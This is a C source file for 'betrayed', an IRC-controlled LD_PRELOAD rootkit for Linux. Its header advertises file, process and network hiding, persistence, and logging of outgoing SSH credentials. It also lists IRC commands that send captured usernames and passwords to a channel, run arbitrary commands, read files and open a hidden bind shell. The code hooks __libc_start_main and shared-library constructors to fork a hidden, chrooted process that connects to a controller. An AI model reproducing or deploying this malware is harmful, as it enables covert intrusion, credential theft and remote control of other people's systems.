/*
  ▄▄▄▄· ▄▄▄ .▄▄▄▄▄▄▄▄   ▄▄▄·  ▄· ▄▌▄▄▄ .·▄▄▄▄  
  ▐█ ▀█▪▀▄.▀·•██  ▀▄ █·▐█ ▀█ ▐█▪██▌▀▄.▀·██▪ ██ 
  ▐█▀▀█▄▐▀▀▪▄ ▐█.▪▐▀▀▄ ▄█▀▀█ ▐█▌▐█▪▐▀▀▪▄▐█· ▐█▌
  ██▄▪▐█▐█▄▄▌ ▐█▌·▐█•█▌▐█ ▪▐▌ ▐█▀·.▐█▄▄▌██. ██ 
  ·▀▀▀▀  ▀▀▀  ▀▀▀ .▀  ▀ ▀  ▀   ▀ •  ▀▀▀ ▀▀▀▀▀• 

    IRC-controlled LD_PRELOAD Linux rootkit.

    Features:
        file hiding,
        process hiding,
        network hiding,
        installation persistence,
        outgoing ssh cred logging
    IRC commands:
        `!ssh_logs [nick]` (reads outgoing SSH logs, sends usernames and passwords to your desired IRC channel)
        `!sh [nick] [command]` (executes commands on chosen server, and sends command output to the channel)
        `!read_file [nick] [path]` (sends contents of path to IRC channel)
        `!bind [nick] [port]` (creates a hidden /bin/sh bind shell on given port which you can connect to)
        `!kill [nick]/all` (kills chosen iteration of betrayed. removes all respective rootkit files and disconnects)
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <errno.h>
#include <dlfcn.h>
#include <termio.h>
#include <dirent.h>
#include <time.h>
#include <netdb.h>
#include <signal.h>
#include <limits.h>
#include <fnmatch.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <linux/netlink.h>

#include "betrayed.h"
#include "config.h"

#include "utils/utils.h"
#include "hooks/hooks.h"

/* this function is responsible for creating & hiding our process,
 * and beginning to read from sockfd & parse data. */
int init_betrayed(void)
{
    /* it's mandatory that we have root privs. */
    if(getuid() != 0) return 0;
    reinstall();

    /* we don't need to fork off of every single process that is created,
     * and we want to ignore some specific processes. */
    if(is_betrayed_alive() || is_bad_proc(cprocname())) return 0;

    if((pid=fork()) == 0)
    {
        (void) setpgrp(); /* we are our own process. */
        (void) setgid(MGID); /* hide our process once we've forked. and we know we're root. */
        (void) chroot(INSTALL_DIR); /* set proc root to hidden rootkit home directory */

        (void) sleep(BPROC_WAIT); /* wait BPROC_WAIT secs before doing anything. this helps us stay hidden. */

        sockfd = setup_connection(); /* make socket, connect to socket. exit(0) if we can't connect. */
        (void) signal(SIGTERM,(sighandler_t)commit_termicide); /* setup SIGTERM signal handler. */

        betrayer(sockfd); /* read from/write to sockfd and command handling. */
        return 1;
    }else if(pid < 0) return pid;
    return 0;
}

int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end))
{
    if(init_betrayed()) kill_rk_procs();
    HOOK(o_libc_start_main, "__libc_start_main");
    return o_libc_start_main(main,argc,ubp_av,init,fini,rtld_fini,stack_end);
}

void __attribute ((constructor)) binit(void)
{
    if(init_betrayed()) kill_rk_procs();
}

void __attribute ((destructor)) bfini(void)
{
    if(init_betrayed()) kill_rk_procs();
}
